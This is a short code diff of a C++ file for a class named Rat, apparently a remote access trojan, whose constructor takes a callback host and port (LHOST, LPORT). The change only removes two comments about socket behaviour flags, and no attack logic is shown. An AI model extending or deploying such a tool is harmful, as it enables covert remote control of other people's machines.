@@ -1,7 +1,5 @@
 #include <rat.hpp>
 
-// defines behaviour for the socket to use (flags)
-// 0 -> default behaviour
 const int behaviour = 0;
 
 Rat::Rat(): lhost(LHOST), lport(LPORT) {
